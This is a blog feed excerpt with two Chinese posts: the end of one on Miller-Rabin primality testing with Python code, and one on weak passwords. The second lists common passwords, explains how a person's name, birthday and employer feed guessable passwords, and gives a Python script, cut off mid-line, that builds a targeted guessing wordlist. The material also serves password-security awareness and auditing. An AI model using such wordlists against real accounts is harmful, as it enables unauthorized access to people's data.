      if x = 1 then
         return composite
      if x = n − 1 then
         continue WitnessLoop
   return composite
return probably prime
</code></pre><h2 id="0x01-实现"><a href="#0x01-实现" class="headerlink" title="0x01 实现"></a>0x01 实现</h2><p>一开始针对这个米勒拉宾素性检测算法里的幂模运算，我以为用<a href="http://blog.csdn.net/linraise/article/details/17490769" target="_blank" rel="external">蒙哥马利算法－快速幂模</a>要比pow()函数更快，结果还是内置的pow()更快：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># x = a^d n n</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">montgomery</span><span class="params">(a, d, n)</span>:</span></div><div class="line">    x = <span class="number">1</span></div><div class="line">    <span class="keyword">while</span> d:</div><div class="line">        <span class="keyword">if</span> (d &amp; <span class="number">1</span>):</div><div class="line">            x = (x * a) % n</div><div class="line">        d &gt;&gt;= <span class="number">1</span>  </div><div class="line">        a = (a * a) % n</div><div class="line">    <span class="keyword">return</span> x</div></pre></td></tr></table></figure><p>上面的伪代码中a的选取是可以优化的，可以看到下面代码有实现，原理看一下<a href="https://en.wikipedia.org/wiki/Miller%E2%80%93Rabin_primality_test" target="_blank" rel="external">wikipedia</a>：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_a_list</span><span class="params">(n)</span>:</span></div><div class="line">    <span class="keyword">if</span> n &lt; <span class="number">2047</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>,]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">1373653</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">9080191</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">31</span>, <span class="number">73</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">25326001</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3215031751</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">4759123141</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">7</span>, <span class="number">61</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">1122004669633</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">13</span>, <span class="number">23</span>, <span class="number">1662803</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">2152302898747</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3474749660383</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">341550071728321</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3825123056546413051</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">318665857834031151167461</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3317044064679887385961981</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">97</span>]</div></pre></td></tr></table></figure><h2 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h2><p>用这个方法检测素数，100位10进制数平均0.0003，1000位10进制数平均0.09秒，10000位10进制数平均60秒。</p><h2 id="0x03-完整代码"><a href="#0x03-完整代码" class="headerlink" title="0x03 完整代码"></a>0x03 完整代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="comment"># author:admin[@hackfun.org]</span></div><div class="line"><span class="comment"># license:GPL v3</span></div><div class="line"><span class="comment"># blog:hackfun.org</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_a_list</span><span class="params">(n)</span>:</span></div><div class="line">    <span class="keyword">if</span> n &lt; <span class="number">2047</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>,]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">1373653</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">9080191</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">31</span>, <span class="number">73</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">25326001</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3215031751</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">4759123141</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">7</span>, <span class="number">61</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">1122004669633</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">13</span>, <span class="number">23</span>, <span class="number">1662803</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">2152302898747</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3474749660383</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">341550071728321</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3825123056546413051</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">318665857834031151167461</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3317044064679887385961981</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">97</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_r_d</span><span class="params">(n)</span>:</span></div><div class="line">    n -= <span class="number">1</span></div><div class="line">    r = <span class="number">0</span></div><div class="line">    d = n</div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        <span class="keyword">if</span> n % <span class="number">2</span> != <span class="number">0</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">        r += <span class="number">1</span></div><div class="line">        d = n / <span class="number">2</span></div><div class="line">        n /= <span class="number">2</span></div><div class="line">    <span class="keyword">return</span> r, d</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">miller_rabin_primality_test</span><span class="params">(n)</span>:</span></div><div class="line">    <span class="string">"""use miller rabin primality test to judge n whether prime"""</span></div><div class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</div><div class="line">        n = -n</div><div class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">if</span> n == <span class="number">2</span> <span class="keyword">or</span> n == <span class="number">3</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    r, d = calc_r_d(n)</div><div class="line">    a_list = select_a_list(n)</div><div class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(len(a_list)):</div><div class="line">        a = random.sample(a_list, <span class="number">1</span>)[<span class="number">0</span>] <span class="comment"># Select one non-repeating random number from the list at a time</span></div><div class="line">        a_list.remove(a)</div><div class="line">        x = pow(a, d, n)</div><div class="line">        <span class="keyword">if</span> x == <span class="number">1</span> <span class="keyword">or</span> x == n - <span class="number">1</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> xrange(r - <span class="number">1</span>):</div><div class="line">            x = pow(x, <span class="number">2</span>, n)</div><div class="line">            <span class="keyword">if</span> x ==<span class="number">1</span>:</div><div class="line">                <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">            <span class="keyword">if</span> x == n - <span class="number">1</span>:</div><div class="line">                <span class="keyword">break</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 学习记录 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
            <tag> 蒙哥马利算法 </tag>
            
            <tag> 米勒拉宾素性检测算法 </tag>
            
            <tag> 快速幂模 </tag>
            
            <tag> 超大数素性检测 </tag>
            
            <tag> 最快的超大数素性检测 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浅析弱口令]]></title>
      <url>/2017/03/16/%E6%B5%85%E6%9E%90%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
      <content type="html"><![CDATA[<p><img src="https://www.hackfun.org/usr/uploads/2017/03/3619832931.png" alt="浅析弱口令.png"></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>弱口令其实是长期以来一直存在的问题，直到今天我们还能经常听某个著名厂商公司因为存在弱口令问题而导致大量内部或外部用户信息泄露，甚至商业计划和机密泄露，所以一个安全密码设置的重要性不言而喻，涉及密码，不得谈到密码的强弱，当然强弱密码的区分没有一个严格明确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或容易被破解工具破解的口令均为弱密码，在此我粗略谈谈弱密码方面，也就是我们经常说到的弱口令。</p><p>其实设置密码的强弱很大程度上与这个人的个人习惯和安全意识有关，当然还是受其他的因素的影响，比如公司出于安全考虑要求设置强密码等其他强制硬性要求，个人觉得弱口令可以大致分为两类，一类就是公共弱口令，另一类就是个人弱口令。</p><a id="more"></a><h2 id="0x01-公共弱口令"><a href="#0x01-公共弱口令" class="headerlink" title="0x01 公共弱口令"></a>0x01 公共弱口令</h2><p>公共弱口令也就是根据大量的密码数据统计得出的出现频率较高弱口令，关于这方面的弱口令统计结果有很多，在此我就列举一些出现频率比较高的公共弱口令：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div></pre></td><td class="code"><pre><div class="line">0123456789</div><div class="line">aa123456789</div><div class="line">zxcvbnm</div><div class="line">QAZ123</div><div class="line">asdfghjkl</div><div class="line">wang123456</div><div class="line">qwer1234</div><div class="line">123456789qq</div><div class="line">q123456789</div><div class="line">1qazxsw2</div><div class="line">100200</div><div class="line">123qweasd</div><div class="line">7894561230</div><div class="line">7758521</div><div class="line">123456789</div><div class="line">zxc123</div><div class="line">qq123123</div><div class="line">abcd123</div><div class="line">7758258</div><div class="line">zhang123</div><div class="line">123321</div><div class="line">1A2B3C4D</div><div class="line">asd123</div><div class="line">789456123</div><div class="line">5845201314</div><div class="line">qwe123</div><div class="line">123456.</div><div class="line">000000000</div><div class="line">qq123456789</div><div class="line">123698745</div><div class="line">1q2w3e4r</div><div class="line">nihao123</div><div class="line">123123</div><div class="line">w123456</div><div class="line">1233211234567</div><div class="line">z123456789</div><div class="line">520520</div><div class="line">7708801314520</div><div class="line">110120</div><div class="line">147258369</div><div class="line">1234554321</div><div class="line">123qwe</div><div class="line">11111111</div><div class="line">a111111</div><div class="line">584520</div><div class="line">456852</div><div class="line">wang123</div><div class="line">123456789..</div><div class="line">1q2w3e</div><div class="line">123abc</div><div class="line">qaz123456</div><div class="line">123456</div><div class="line">123456asd</div><div class="line">zxcvbnm123</div><div class="line">qazwsxedc</div><div class="line">31415926</div><div class="line">1314520520</div><div class="line">aaaaaa</div><div class="line">123456789a</div><div class="line">caonima</div><div class="line">1123581321</div><div class="line">woaini1314</div><div class="line">1234567891234567</div><div class="line">147258</div><div class="line">5201314a</div><div class="line">qwe123456</div><div class="line">love1314</div><div class="line">159753</div><div class="line">5841314520</div><div class="line">666666</div><div class="line">aa123456</div><div class="line">1q2w3e4r5t</div><div class="line">5201314</div><div class="line">1234567891</div><div class="line">1234567890</div><div class="line">123456abc</div><div class="line">qazwsx123</div><div class="line">iloveyou</div><div class="line">741852963</div><div class="line">abc123</div><div class="line">123456789.</div><div class="line">12qwaszx</div><div class="line">1111111111</div><div class="line">caonima123</div><div class="line">111111a</div><div class="line">q1w2e3</div><div class="line">q123456</div><div class="line">aptx4869</div><div class="line">0000000000000000</div><div class="line">www123456</div><div class="line">woaini123</div><div class="line">12345678910</div><div class="line">asdasd123</div><div class="line">0000000000</div><div class="line">asd123456</div><div class="line">abc123456</div><div class="line">zxc123456</div><div class="line">qq5201314</div><div class="line">a12345678</div><div class="line">qq123456</div><div class="line">5211314</div><div class="line">1111111111111111</div><div class="line">1234567899</div><div class="line">123123a</div><div class="line">123654</div><div class="line">110110</div><div class="line">12345678</div><div class="line">12345678900</div><div class="line">123123123</div><div class="line">abc123456789</div><div class="line">a000000</div><div class="line">123456q</div><div class="line">woaini1314520</div><div class="line">abcd123456</div><div class="line">aaa123</div><div class="line">000000</div><div class="line">123000</div><div class="line">qwertyuiop</div><div class="line">a5201314</div><div class="line">123456a</div><div class="line">s123456</div><div class="line">1234qwer</div><div class="line">abcd1234</div><div class="line">1357924680</div><div class="line">123456aa</div><div class="line">qwerty</div><div class="line">753951</div><div class="line">woaini</div><div class="line">5201314520</div><div class="line">111111111</div><div class="line">as123456</div><div class="line">1472583690</div><div class="line">z123456</div><div class="line">123456789abc</div><div class="line">qq1314520</div><div class="line">1qaz2wsx</div><div class="line">159357</div><div class="line">9876543210</div><div class="line">112233</div><div class="line">1314521</div><div class="line">1314520</div><div class="line">000000a</div><div class="line">987654321</div><div class="line">123456qq</div><div class="line">123456..</div><div class="line">asdasd</div><div class="line">521521</div><div class="line">52013145201314</div><div class="line">aaa123456</div><div class="line">135792468</div><div class="line">w123456789</div><div class="line">a123456789</div><div class="line">woaini521</div><div class="line">woaini520</div><div class="line">aini1314</div><div class="line">q1w2e3r4</div><div class="line">111111</div><div class="line">123456789q</div><div class="line">110120119</div><div class="line">a123123</div><div class="line">a123456</div><div class="line">a123321</div></pre></td></tr></table></figure><p></p><h2 id="0x02-个人弱口令"><a href="#0x02-个人弱口令" class="headerlink" title="0x02 个人弱口令"></a>0x02 个人弱口令</h2><p>个人弱口令往往与这个人的个人信息（姓名，生日，手机号，特殊昵称，爱好，社交软件账号，常用username,邮箱…），关系成员（家庭成员，男女朋友…），所处环境（车牌号，公司信息比如公司名称，公司成立时间或地点，公司domain等…），还有特殊的指定字符（数字，单词…），在这里我也列举一些经常出现的组合：</p><pre><code>生日                 19901014（农历和国历都可以考虑）
身份证后六位         143256
自己或关系成员中文名拼音           Xiaoming ...
自己或关系成员中文名拼音+生日      xiaoming19901014 ...
自己或关系成员中文名拼音+特定字符  xiaoming5201314 ...
username+生日        mingxiaozi19901014 ...
username+特定字符    mingxiaozi5201314 ...
公司名拼音           JingDong  （这里没有特定针对某东，只是举个例子，虽然他们曾经出新过此类问题）
公司名拼音+特定字符  jingdongxxxx
公司domain           www.xx.com
公司domain+时间      xx20150101
username+domain      mingxiaozijd
组合有很多种，没有一一列举，可以自由发挥。
</code></pre><p>另提示一点:当系统要求密码组合必须包含大写字母时候，根据中国人密码设定习惯，会有83%的人将大写字母，且是唯一存在的大写字母放在第一位。</p><h2 id="0x03-弱口令生成"><a href="#0x03-弱口令生成" class="headerlink" title="0x03 弱口令生成"></a>0x03 弱口令生成</h2><p>关于弱口令生成可以利用相关工具或者脚本，工具的话网上有很多，可以自行搜索下载，在这里我提供自己写的python小脚本，如果有需要请自行修改，仅作参考：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*- </span></div><div class="line">weak_password=[<span class="string">'000000'</span>,<span class="string">'0000000'</span>,<span class="string">'111111'</span>,<span class="string">'11111111'</span>,<span class="string">'112233'</span>,<span class="string">'123123'</span>,<span class="string">'123321'</span>,<span class="string">'123456'</span>,<span class="string">'12345678'</span>,<span class="string">'87654321'</span>,<span class="string">'123456789'</span>,<span class="string">'987654321'</span>,<span class="string">'1234567890'</span>,<span class="string">'0123456789'</span>,<span class="string">'654321'</span>,<span class="string">'666666'</span>,<span class="string">'888888'</span>,<span class="string">'666888'</span>,<span class="string">'66668888'</span>,<span class="string">'abcdef'</span>,<span class="string">'147258369'</span>,<span class="string">'abcabc'</span>,<span class="string">'abc123'</span>,<span class="string">'a1b2c3'</span>,<span class="string">'aaa111'</span>,<span class="string">'123qwe'</span>,<span class="string">'qweasd'</span>,<span class="string">'admin'</span>,<span class="string">'root'</span>,<span class="string">'pass123'</span>,<span class="string">'p@ssword'</span>,<span class="string">'password'</span>,<span class="string">'passwd'</span>,<span class="string">'iloveyou'</span>,<span class="string">'woaini'</span>,<span class="string">'5201314'</span>,<span class="string">'qq123456'</span>,<span class="string">'taobao'</span>,<span class="string">'wang1234'</span>]</div><div class="line">    </div><div class="line">foreign_weak_password=[<span class="string">'password'</span>,<span class="string">'123456'</span>,<span class="string">'12345678'</span>,<span class="string">'qwerty'</span>,<span class="string">'abc123'</span>,<span class="string">'monkey'</span>,<span class="string">'1234567'</span>,<span class="string">'letmein'</span>,<span class="string">'trustno1'</span>,<span class="string">'dragon'</span>,<span class="string">'baseball'</span>,<span class="string">'111111'</span>,<span class="string">'iloveyou'</span>,<span class="string">'master'</span>,<span class="string">'sunshine'</span>,<span class="string">'ashley'</span>,<span class="string">'bailey'</span>,<span class="string">'passw0rd'</span>,<span class="string">'shadow'</span>,<span class="string">'123123'</span>,<span class="string">'654321'</span>,<span class="string">'superman'</span>,<span class="string">'qazwsx'</span>,<span class="string">'michael'</span>,<span class="string">'football'</span>,<span class="string">'qwerty'</span>,<span class="string">'welcome'</span>,<span class="string">'ninja'</span>,<span class="string">'hello'</span>,<span class="string">'happy'</span>,<span class="string">'anything'</span>,<span class="string">'abcabcabc'</span>,<span class="string">'qwert123'</span>,<span class="string">'system'</span>,<span class="string">'command'</span>,<span class="string">'adminstrator'</span>,<span class="string">'mouse'</span>,<span class="string">'harddisk'</span>]</div><div class="line">    </div><div class="line">name=[<span class="string">'xiaoming'</span>,<span class="string">'Xiaoming'</span>,<span class="string">'xiaoMing'</span>,<span class="string">'xiao_ming'</span>,<span class="string">'xiaoM'</span>,<span class="string">'XMing'</span>,<span class="string">'Xming'</span>,<span class="string">'xl'</span>,<span class="string">'XM'</span>]</div><div class="line">    </div><div class="line">birth=[<span class="string">'1995'</span>,<span class="string">'_1995'</span>,<span class="string">'09'</span>,<span class="string">'9'</span>,<span class="string">'23'</span>,<span class="string">'199509'</span>,<span class="string">'_950923'</span>,<span class="string">'_199509'</span>,<span class="string">'9509'</span>,<span class="string">'0923'</span>,<span class="string">'19950925'</span>]</div><div class="line">    </div><div class="line">specialnum=[<span class="string">'1314'</span>,<span class="string">'520'</span>,<span class="string">'000'</span>,<span class="string">'111'</span>,<span class="string">'123'</span>,<span class="string">'168'</span>,<span class="string">'1234'</span>,<span class="string">'123456'</span>,<span class="string">'5201314'</span>,<span class="string">'888'</span>,<span class="string">'666'</span>,<span class="string">'123123'</span>]</div><div class="line">    </div><div class="line">id=[<span class="string">'mingxiaozi'</span>,<span class="string">'xiaolifeidao'</span>]</div><div class="line">    </div><div class="line">companyinfo=[<span class="string">'jingdong'</span>,<span class="string">'JongDong'</span>,<span class="string">'jd'</span>,<span class="string">'JD'</span>]</div><div class="line"></div><div class="line"><span class="comment">#自行添加更多信息</span></div><div class="line"></div><div class="line">f=open(<span class="string">'weakpasswords.txt'</span>,<span class="string">'w'</span>)</div><div class="line"><span class="keyword">for</span> a <span class="keyword">in</span> weak_password:</div><div class="line">    f.write(a+<span class="string">'\n'</span>)</div><div class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> foreign_weak_password:</div><div class="line">    	f.write(b+<span class="string">'\n'</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> name:</div><div class="line">		<span class="keyword">for</span> d <span class="keyword">in</span> birth:</div><div class="line">			f.write(c+d+<span 